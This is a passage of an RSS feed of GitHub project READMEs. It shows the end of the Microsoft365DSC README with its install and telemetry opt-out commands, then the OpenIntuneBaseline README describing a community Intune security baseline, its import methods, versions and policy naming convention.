&lt;p&gt;&lt;a href=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/Global%20-%20Integration%20-%20INTUNE.yml&quot;&gt;&lt;img src=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/Global%20-%20Integration%20-%20INTUNE.yml/badge.svg?sanitize=true&quot; alt=&quot;Global - Integration - INTUNE&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/Unit%20Tests.yml&quot;&gt;&lt;img src=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/Unit%20Tests.yml/badge.svg?sanitize=true&quot; alt=&quot;Unit Tests&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Contributors are encouraged to propose their contributions as pull requests to this development branch. This branch will periodically be merged to the master branch, and be released to &lt;a href=&quot;https://www.powershellgallery.com/&quot;&gt;PowerShell Gallery&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;How to Install&lt;/h2&gt; 
&lt;p&gt;To acquire the latest bits of the module from a machine that has internet connectivity, run the following PowerShell lines:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-PowerShell&quot;&gt;Install-Module -Name Microsoft365DSC -Force
Update-M365DSCModule
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Telemetry Disclaimer&lt;/h2&gt; 
&lt;p&gt;Microsoft365DSC captures Telemetry data about the names of the resources in which a configuration drift has been detected, along with the type of exceptions being thrown by errors in the various modules. While no sensitive data is ever captured, App Insights, which performs telemetry analytics, captures information about the city where the telemetry entries were captured by default. Users can opt-out to prevent telemetry from being sent back to the Microsoft365DSC team by running the following command:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-PowerShell&quot;&gt;Set-M365DSCTelemetryOption -Enabled $False
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>SkipToTheEndpoint/OpenIntuneBaseline</title>
      <link>https://github.com/SkipToTheEndpoint/OpenIntuneBaseline</link>
      <description>&lt;p&gt;Community-driven baseline to accelerate Intune adoption and learning.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;OpenIntuneBaseline&lt;/h1&gt; 
&lt;p align=&quot;center&quot;&gt; &lt;a href=&quot;https://x.com/SkipToEndpoint&quot;&gt; &lt;img alt=&quot;X (formerly Twitter) Follow&quot; src=&quot;https://img.shields.io/twitter/follow/SkipToEndpoint?style=social&amp;amp;label=Follow%20on%20X&quot; target=&quot;_blank&quot; /&gt; &lt;/a&gt; | &lt;a href=&quot;https://bsky.app/profile/skiptotheendpoint.co.uk&quot;&gt; &lt;img alt=&quot;BlueSky URL&quot; src=&quot;https://img.shields.io/badge/dynamic/json?url=https%3A%2F%2Fpublic.api.bsky.app%2Fxrpc%2Fapp.bsky.actor.getProfile%2F%3Factor%3Dskiptotheendpoint.co.uk&amp;amp;query=%24.followersCount&amp;amp;style=social&amp;amp;logo=bluesky&amp;amp;label=Follow%20on%20BSky&quot; target=&quot;_blank&quot; /&gt; &lt;/a&gt; | &lt;a href=&quot;https://skiptotheendpoint.co.uk&quot;&gt; &lt;img alt=&quot;Blog&quot; src=&quot;https://img.shields.io/badge/Read%20My%20Blog-grey?style=flat-square&amp;amp;logo=ghost&quot; target=&quot;_blank&quot; /&gt; &lt;/a&gt; &lt;/p&gt; 
&lt;p align=&quot;center&quot;&gt; &lt;a href=&quot;https://discord.gg/winadmins&quot;&gt; &lt;img alt=&quot;Discord&quot; src=&quot;https://img.shields.io/discord/618712310185197588?label=Join%20WinAdmins&amp;amp;logo=discord&amp;amp;style=flat-square&quot; target=&quot;_blank&quot; /&gt; &lt;/a&gt; &lt;/p&gt; 
&lt;hr /&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!IMPORTANT] This has been developed as a starting point or foundation and is not necessarily considered &quot;complete&quot;. It is being made available to allow learning, development, and knowledge-sharing amongst communities.&lt;/p&gt; 
 &lt;p&gt;No liability is assumed for the usage or application of the settings within this project in production tenants.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;hr /&gt; 
&lt;h2&gt;About the Author&lt;/h2&gt; 
&lt;p&gt;James is a Technical Architect and Microsoft MVP in both Intune and Windows, and has been working in the IT industry for over 20 years, with the last 8 being primarily within Intune. He is also a recognised contributor to the CIS Windows Benchmarks. He has a wealth of experience across the Microsoft 365 stack, with a focus on security and compliance, and is a regular attendee and speaker at community events such as &lt;a href=&quot;https://mmsmoa.com/&quot;&gt;MMS&lt;/a&gt; and &lt;a href=&quot;https://www.wpninjas.ch/events/&quot;&gt;Workplace Ninja Summit&lt;/a&gt;, and is passionate about sharing knowledge and helping others.&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;About the Project&lt;/h2&gt; 
&lt;h3&gt;Project History&lt;/h3&gt; 
&lt;p&gt;The OpenIntuneBaseline (OIB) project was started in early 2021 as a way to provide a &quot;known good&quot; baseline security posture for Windows devices managed by Microsoft Intune, after being disappointed with the admin and user experience of other available baselines.&lt;/p&gt; 
&lt;h3&gt;Security Framework Adherence&lt;/h3&gt; 
&lt;p&gt;When creating the initial Windows baseline, substantial data analysis was carried out over well-known security frameworks, such as:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;NCSC Device Security Guidance&lt;/li&gt; 
 &lt;li&gt;CIS Windows Benchmarks&lt;/li&gt; 
 &lt;li&gt;ACSC Essential Eight&lt;/li&gt; 
 &lt;li&gt;Intune Security Baselines for Windows, Edge &amp;amp; Defender for Endpoint&lt;/li&gt; 
 &lt;li&gt;Microsoft Best Practice&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;The OIB was not created by simply applying the recommendations from these frameworks. While there is obviously significant overlap, I was driven to create something that included a number of user-experience additions not seen in the above frameworks, as well as my own significant experience implementing these across multiple customer environments, and how admin managability can be impacted by doing so.&lt;/p&gt; 
&lt;p&gt;Security frameworks tend to be seen as unmovable hard requirements rather than what they are, which is a set of &lt;strong&gt;recommendations&lt;/strong&gt;. In fact, the CIS themselves preface their benchmarks with the following:&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;It is acceptable if &lt;em&gt;&lt;strong&gt;100% of the benchmark is not applied&lt;/strong&gt;&lt;/em&gt;, as it is the responsibility and decision of each organization to determine which settings are applicable to their unique needs.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;It is &lt;strong&gt;impossible&lt;/strong&gt; to create a true &quot;one-size-fits-all&quot; set of policies due to the massively differing nature of enterprise requirements. There is also a significant amount of &quot;noise&quot; in the security community, with many recommending settings that are not necessarily required or beneficial, such as enforcing default behaviour that a standard user cannot change, or settings that have been included in GPO baselines since the days of Windows 7.&lt;/p&gt; 
&lt;p&gt;This baseline is designed to be a starting point or guide, and all configurations applied to an environment regardless of source should be reviewed and adjusted to suit your own business requirements.&lt;/p&gt; 
&lt;p&gt;That being said, if there&#39;s something you feel is missing or should be included, please feel free to raise an issue or submit a PR.&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;Importing the Baseline&lt;/h2&gt; 
&lt;p&gt;You have two options when importing the baseline:&lt;/p&gt; 
&lt;h3&gt;&lt;strong&gt;IntuneManagement&lt;/strong&gt;&lt;/h3&gt; 
&lt;p&gt;This is the recommended method, as it allows for an import of the entire baseline.&lt;/p&gt; 
&lt;p&gt;These files have been exported using the &lt;a href=&quot;https://github.com/Micke-K/IntuneManagement&quot;&gt;IntuneManagement&lt;/a&gt; tool developed by &lt;a href=&quot;https://twitter.com/Micke_K_72&quot;&gt;Mikael Karlsson&lt;/a&gt;, and can be imported in the same way. Please consult the IntuneManagement documentation for further information on how to import the baseline or for issues.&lt;/p&gt; 
&lt;p&gt;You can choose to import as much or as little of the baseline as you wish, though you will need to change the &quot;Root folder&quot; to the appropriate folder for the platform (e.g. WINDOWS), or policy types (e.g. Settings Catalog) you wish to import.&lt;/p&gt; 
&lt;h3&gt;&lt;strong&gt;Native Import&lt;/strong&gt;&lt;/h3&gt; 
&lt;p&gt;I understand not everyone has the ability or permissions to use the IntuneManagement tool, and have been asked to support using the &lt;a href=&quot;https://learn.microsoft.com/en-us/mem/intune/configuration/settings-catalog?tabs=sc-search-filter%2Csc-reporting#import-and-export-a-profile&quot;&gt;native import/export functionality in Intune&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;NOTE: The Native Import is limited to only importing Settings Catalog policies in the Device Configuration blade. This means settings outside of that (e.g. Compliance, Endpoint Security) are not available. I would recommend submitting feedback within Intune to expand the ability to import/export all policy types.&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;Versioning &amp;amp; Repo Structure&lt;/h2&gt; 
&lt;p&gt;This project started as Windows only and the naming convention has been somewhat... fluid. Now that additional OS&#39;s have been added, some form of standardisation is necessary. Version numbers will primarily follow the format of &lt;code&gt;Major.Minor&lt;/code&gt;, occasionally using &lt;code&gt;Major.Minor.Patch&lt;/code&gt; if something fits in the &quot;bug fix&quot; category.&lt;/p&gt; 
&lt;p&gt;Each OS will have its own folder, with OS-specific files (readme, changelog, baseline JSON&#39;s, supporting information etc.) contained within.&lt;/p&gt; 
&lt;p&gt;The current OIB versions are:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align=&quot;center&quot;&gt;OS&lt;/th&gt; 
   &lt;th align=&quot;center&quot;&gt;Current Release&lt;/th&gt; 
   &lt;th align=&quot;center&quot;&gt;Change Log&lt;/th&gt; 
   &lt;th align=&quot;center&quot;&gt;Wiki Page&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/SkipToTheEndpoint/OpenIntuneBaseline/tree/main/WINDOWS&quot;&gt;Windows&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/SkipToTheEndpoint/OpenIntuneBaseline/releases/tag/windows-v3.6&quot;&gt;v3.6&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://raw.githubusercontent.com/SkipToTheEndpoint/OpenIntuneBaseline/main/WINDOWS/CHANGELOG.md&quot;&gt;Link&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/SkipToTheEndpoint/OpenIntuneBaseline/wiki/win-readme&quot;&gt;Link&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/SkipToTheEndpoint/OpenIntuneBaseline/tree/main/WINDOWS365&quot;&gt;Windows 365&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/SkipToTheEndpoint/OpenIntuneBaseline/releases/tag/win365-v1.0&quot;&gt;v1.0&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://raw.githubusercontent.com/SkipToTheEndpoint/OpenIntuneBaseline/main/WINDOWS365/CHANGELOG.md&quot;&gt;Link&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/SkipToTheEndpoint/OpenIntuneBaseline/wiki/win365-readme&quot;&gt;Link&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/SkipToTheEndpoint/OpenIntuneBaseline/tree/main/MACOS&quot;&gt;MacOS&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/SkipToTheEndpoint/OpenIntuneBaseline/releases/tag/macos-v1.0&quot;&gt;v1.0&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://raw.githubusercontent.com/SkipToTheEndpoint/OpenIntuneBaseline/main/MACOS/CHANGELOG.md&quot;&gt;Link&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/SkipToTheEndpoint/OpenIntuneBaseline/wiki/macos-readme&quot;&gt;Link&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;Please consult the wiki pages and README.md in each OS folder for more information.&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;Policy Naming Convention&lt;/h2&gt; 
&lt;p&gt;Across the OIB, the following naming convention is used, seen below with some examples:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align=&quot;center&quot;&gt;OS&lt;/th&gt; 
   &lt;th align=&quot;center&quot;&gt;&lt;/th&gt; 
   &lt;th align=&quot;center&quot;&gt;Identifier&lt;/th&gt; 
   &lt;th align=&quot;center&quot;&gt;&lt;/th&gt; 
   &lt;th align=&quot;center&quot;&gt;Category&lt;/th&gt; 
   &lt;th align=&quot;center&quot;&gt;&lt;/th&gt; 
   &lt;th align=&quot;center&quot;&gt;Device/User Assignment&lt;/th&gt; 
   &lt;th align=&quot;center&quot;&gt;&lt;/th&gt; 
   &lt;th align=&quot;center&quot;&gt;Sub-Category&lt;/th&gt; 
   &lt;th align=&quot;center&quot;&gt;&lt;/th&gt; 
   &lt;th align=&quot;center&quot;&gt;Version&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;center&quot;&gt;Win&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;-&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;OIB&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;-&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;Device Security&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;-&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;D&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;-&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;Login and Lock Screen&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;-&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;v3.0&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;center&quot;&gt;Win365&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;-&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;OIB&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;-&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;Device Security&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;-&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;D&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;-&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;Resource Redirection&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;-&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;v1.0&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;center&quot;&gt;MacOS&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;-&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;OIB&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;-&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;Microsoft Edge&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;-&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;D&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;-&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;Security&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;-&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;v1.0&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;Further information on the naming convention can be found in the &lt;a href=&quot;https://raw.githubusercontent.com/SkipToTheEndpoint/OpenIntuneBaseline/main/FAQ.md#why-do-policies-have-d-and-u-in-their-name&quot;&gt;FAQ&lt;/a&gt;.&lt;/p&gt;</description>
    </item>
    
  </channel>
</rss>
